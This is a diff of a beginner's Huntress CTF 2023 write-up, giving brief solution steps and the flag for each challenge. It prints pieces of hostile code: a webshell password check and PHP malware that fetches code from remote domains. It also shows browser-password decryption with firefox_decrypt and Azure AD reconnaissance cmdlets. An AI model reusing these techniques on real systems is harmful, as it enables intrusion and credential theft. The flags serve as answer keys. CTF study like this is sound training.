@@ -1,8 +1,7 @@
+# Huntress CTF October 2023
 This was my first CTF challenge and even more my first write up.
-Some of it are just random notes written down while doing the challenges and aren't anywhere near completion others are full writeups so it's possible to understand which step are required to solve the challenges. I've learned a lot about CTF and also about writing documentation so it is possible for others to understand what I've done. 
-
-# Huntress CTF Oktober 2023
-## Book by its cover:
+Some of it are just random notes written down while doing the challenges and aren't anywhere near completion others are full writeups so it's possible to understand which step are required to solve the challenges. I've learned a lot about CTF and also about writing documentation so it is possible for others to understand what I've done.
+## Book by its cover
 "They say you aren't supposed to judge a book by its cover, but this is one of my favorites!"
 
 Files: book.rar
@@ -19,9 +18,9 @@ You then want to convert the file to a png file, to do that you have to do the f
 
 Afterwards you can open the picture in the GUI and view the flag
 
-### flag{f8d32a346745a6c4bf4e9504ba5308f0}
+#### flag{f8d32a346745a6c4bf4e9504ba5308f0}
 ---
-## Notepad:
+## Notepad
 "Just a sanity check... you do know how to use a computer, right?"
 
 Files: notepad
@@ -58,9 +57,9 @@ Afterwards its a simple `cat notepad` to reveal:
 +------------------------------------------------------+
 ```
 
-### flag{2dd41e3da37ef1238954d8e7f3217cd8} 
+#### flag{2dd41e3da37ef1238954d8e7f3217cd8} 
 ---
-## String Cheese:
+## String Cheese
 
 "Oh, a cheese stick! This was my favorite snack as a kid. My mom always called it by a different name though... "
 
@@ -68,15 +67,15 @@ First I started by downloading the file and check it contents.
 
 Flag found in the hex value of the picutre
 
-### flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
+#### flag{f4d9f0f70bf353f2ca23d81dcf7c9099}
 ---
-## Read the rules:
+## Read the rules
 "Please follow the rules for this CTF!"
-### flag{90bc54705794a62015369fd8e86e557b} 
+#### flag{90bc54705794a62015369fd8e86e557b} 
 ---
-## Technical Support:
+## Technical Support
 "Want to join the party of GIFs, memes and emoji shenanigans? Or just want to ask a question for technical support regarding any challenges in the CTF?"
-### flag{a98373a74abb8c5ebb8f5192e034a91c}
+#### flag{a98373a74abb8c5ebb8f5192e034a91c}
 ---
 ## Query Code
 "What's this?"
@@ -85,7 +84,7 @@ When you download the file it is name "query_code" and the first step is to find
 To do that we enter `file query_code` and the terminal responds with `query_code: PNG image data, 111 x 111, 1-bit colormap, non-interlaced` so this file is a png image file we then have to rename the file to a *.png* file. We do that by `mv query_code query_code.png`
 We can now open the file and it reveals a QR code. Scan it with a phone and fetch the flag.
 
-### flag{3434cf5dc6a865657ea1ec1cb675ce3b}
+#### flag{3434cf5dc6a865657ea1ec1cb675ce3b}
 ---
 ## HumanTwo
 "During the MOVEit Transfer exploitation, there were tons of "indicators of compromise" hashes available for the `human2.aspx` webshell! We collected a lot of them, but they all look very similar... except for very minor differences. Can you find an oddity?"
@@ -98,7 +97,7 @@ get string:
 	if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000"))
 From hex: 666c6167-7b36-6365-3666-36613135646464623065-6262-3333-3262-66616632623062383564-317d
 ```
-### flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}
+#### flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}
 ---
 ## BaseFFFF+1
 "Maybe you already know about base64, but what if we took it up a notch?"
@@ -114,7 +113,7 @@ If you take the hexidecimal value of *FFFF* of the file name and decode it you g
 If you go Cyberchef you will see that it has an option to decode *base65536* 
 if you enter the string it will reveal the flag.
 
-### flag{716abce880f09b7cdc7938eddf273648}
+#### flag{716abce880f09b7cdc7938eddf273648}
 ---
 ## Traffic
 "We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?   
@@ -133,7 +132,7 @@ ssl.03:00:00-03:53:19.log:1631072773.151055     CCczHL2a9zDFsSWjGd      10.24.0.
 ```
 So lets check the site out! When you get to the site you are presented with the flag.
 
-### flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
+#### flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
 ---
 ## Zerion
 "We observed some odd network traffic, and found this file on our web server... can you find the strange domains that our systems are reaching out to?"
@@ -164,7 +163,7 @@ Next step is to find the url where the flag is hiding. We do that by using the f
 if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) { $code = GC('https://c.-wic5-.com/'); if(!$code){$code = GC('https://c.-oiv3-.com/?flag=flag{af10370d485952897d5183aa09e19883}
 
 ```
-### flag{af10370d485952897d5183aa09e19883}
+#### flag{af10370d485952897d5183aa09e19883}
 ---
 ## Caesarmirror
 "Caesar caesar, on the wall, who is the fairest of them all?   
@@ -176,7 +175,7 @@ Rot13 the file first
 Reverse the text
 and reverse the other part as well
 
-### flag{julius_in_a_reflection} 
+#### flag{julius_in_a_reflection} 
 ---
 ## I wont let you down
 "OK Go take a look at this IP:   
@@ -189,7 +188,7 @@ watch website
 wget 155.138.162.158:8888
 cat index.html
 
-### flag{93671c2c38ee872508770361ace37b02}
+#### flag{93671c2c38ee872508770361ace37b02}
 ---
 ## Dialtone
 "Well would you listen to those notes, that must be some long phone number or something!"
@@ -200,11 +199,11 @@ Decode it using a DTMF decoder
 Convert the BigInt to Hexidecimal
 Cyberchef it "from Hex"
 
-### flag{6c733ef09bc4f2a4313ff63087e25d67}
+#### flag{6c733ef09bc4f2a4313ff63087e25d67}
 ---
 ## PHP Stager
 "Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?"
-### flag{9b5c4313d12958354be6284fcd63dd26}
+#### flag{9b5c4313d12958354be6284fcd63dd26}
 ---
 ## Layered Security
 "It takes a team to do security right, so we have layered our defenses!"
@@ -212,7 +211,7 @@ Cyberchef it "from Hex"
 Open the file in Gimp
 Disable a couple of layers
 
-### flag{9a64bc4a390cb0ce31452820ee562c3f}
+#### flag{9a64bc4a390cb0ce31452820ee562c3f}
 ---
 ## Comprezz
 "Someone stole my S's and replaced them with Z's! Have you ever seen this kind of file before?"
@@ -223,7 +222,7 @@ mv comprezz comprez.z
 uncompress comprez.z
 cat comprez.z
 
-### flag{196a71490b7b55c42bf443274f9ff42b}
+#### flag{196a71490b7b55c42bf443274f9ff42b}
 ---
 ## F12
 "Remember when Missouri got into hacking!?! You gotta be _fast_ to catch this flag!"
@@ -239,7 +238,7 @@ Search for
 
 Go to that site and view source and search for flag
 
-### flag{03e8ba07d1584c17e69ac95c341a2569}
+#### flag{03e8ba07d1584c17e69ac95c341a2569}
 ---
 ## Where am i?
 
@@ -404,10 +403,10 @@ The `-d` paramter will tell the tool that the following file should be decoded a
 
 ```
 base64 -d description.b64         
-flag{b11a3f0ef4bc170ba9409c077355bba2) 
+flag{b11a3f0ef4bc170ba9409c077355bba2} 
 ```
 
-### flag{b11a3f0ef4bc170ba9409c077355bba2)
+#### flag{b11a3f0ef4bc170ba9409c077355bba2}
 ---
 ## Chicken Wings
 "I ordered chicken wings at the local restaurant, but uh... this really isn't what I was expecting..."
@@ -416,7 +415,7 @@ If you know, you know :)
 
 Take the UTF-8 encoded data and paste it into a windings translation
 
-### flag{e0791ce68f718188c0378b1c0a3bdc9e}
+#### flag{e0791ce68f718188c0378b1c0a3bdc9e}
 ---
 ## Dumpster Fire
 "We found all this data in the dumpster! Can you find anything interesting in here, like any cool passwords or anything? Check it out quick before the foxes get to it!"
@@ -429,7 +428,7 @@ cd to the directory ".../huntressctf/dumpsterfire/home/challenge/.mozilla/firefo
 python3 firefox_decrypt.py ~/huntressctf/dumpsterfire/home/challenge/.mozilla/firefox/bc1m1zlr.default-release/
 ```
 
-### flag{35446041dc161cf5c9c325a3d28af3e3}
+#### flag{35446041dc161cf5c9c325a3d28af3e3}
 ---
 ## Baking
 "Do you know how to make cookies? How about HTTP flavored?"
@@ -442,7 +441,7 @@ base64 encode
 save new cookie data
 reload the page and get the flag
 
-### flag{c36fb6ebdbc2c44e6198bf4154d94ed4} 
+#### flag{c36fb6ebdbc2c44e6198bf4154d94ed4} 
 ---
 ## Land before time
 "This trick is nothing new, you know what to do: **iSteg**. Look for the tail that's older than time, this Spike, you shouldn't climb."
@@ -452,24 +451,24 @@ download iSteg (java version)
 run `java -jar iSteg-v2.1_GUI.jar`
 load the png file and show secret
 
-### flag{da1e2bf9951c9eb1c33b1d2008064fee}
+#### flag{da1e2bf9951c9eb1c33b1d2008064fee}
 ---
 ## M365
 
 *General info*
 Get-AADIntTenantDetails
-### flag{dd7bf230fde8d4836917806aff6a6b27}
+#### flag{dd7bf230fde8d4836917806aff6a6b27}
 
 *Conditional Acess Policies*
 Get-AADIntAzureADPolicies
-### flag{d02fd5f79caa273ea535a526562fd5f7}   
+#### flag{d02fd5f79caa273ea535a526562fd5f7}   
 
 *Teams*
 Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName
 
 *The President*
 Get-ADDIntUsers
-### flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}
+#### flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}
 ---
 ## Opposable Thumbs
 "We uncovered a database. Perhaps the flag is right between your fingertips!"
@@ -477,7 +476,7 @@ Get-ADDIntUsers
 Download thumbviewer
 open the thumb256.db file
 view the jpeg and read the flag
-### flag{human_after_all}
+#### flag{human_after_all}
 ---
 ## Wimble
 "_"Gretchen, stop trying to make fetch happen! It's not going to happen!"_ - Regina George, Mean Girls"
@@ -487,7 +486,7 @@ extract the fetch with 7z again
 view the file with Prefetch browser
 navigate to wordpad.exe and read filename string
 
-### flag{97F33C9783C21DF85D79D613BOB258BD}
+#### flag{97F33C9783C21DF85D79D613BOB258BD}
 ---
 ## Opendir
 "A threat actor exposed an open directory on the public internet! We could explore their tools for some further intelligence. Can you find a flag they might be hiding?"
@@ -495,7 +494,7 @@ navigate to wordpad.exe and read filename string
 wget --user opendir --password opendir -m (challenge website)
 grep -r 'flag' .
 ```
-### flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
+#### flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
 ---
 ## Welcome to the Park
 "The creator of Jurassic Park is in hiding... amongst Mach-O files, apparently. Can you find him?"
@@ -595,7 +594,7 @@ That revealed the flag:
 
 ```
 
-### flag{680b736565c76941a364775f06383466}
+#### flag{680b736565c76941a364775f06383466}
 ---
 ## Veebeeeee
 "While investigating a host, we found this strange file attached to a scheduled task. It was invoked with `wscript` or something... can you find a flag?"
@@ -604,7 +603,7 @@ Decoded the file using John Hammond vbs decoder
 Deobfuscate the code
 Go to the weblink and find the flag
 
-### flag{ed81d24958127a2adccfb343012cebff}
+#### flag{ed81d24958127a2adccfb343012cebff}
 ---
 ## Backdoored Splunk
 "You've probably seen Splunk being used for good, but have you seen it used for evil?"
@@ -629,7 +628,7 @@ and the response was:
 ```
 Went into cyberchef and made a From64 and the result was `echo flag{60bb3bfaf703e0fa36730ab70e115bd7}`
 
-### flag{60bb3bfaf703e0fa36730ab70e115bd7}
+#### flag{60bb3bfaf703e0fa36730ab70e115bd7}
 ---
 ## Discord Snowflake Scramble
 "Someone sent [message on a Discord server](https://discord.com/channels/1156647699362361364/1156648139516817519/1156648284237074552) which contains a flag! They did mention something about being able to embed a list of online users on their own website...   
@@ -650,13 +649,13 @@ That will take the unique snowflake ID and look it up for you.
 
 After you join the channel it is possible for you get retrieve the flag from the post in the top.
 
-### flag{bb1dcf163212c54317daa7d1d5d0ce35}
+#### flag{bb1dcf163212c54317daa7d1d5d0ce35}
 ---
 ## Tradegy
 
 **This challenge was accidentally released including the flag and challenge information inside of the attached download.**
 
-### flag{4d442c642df14a7267490da2bb63f522}
+#### flag{4d442c642df14a7267490da2bb63f522}
 ---
 ## Who is Real?
 "This is **not** a technical challenge, but it is a good test of your eye!   
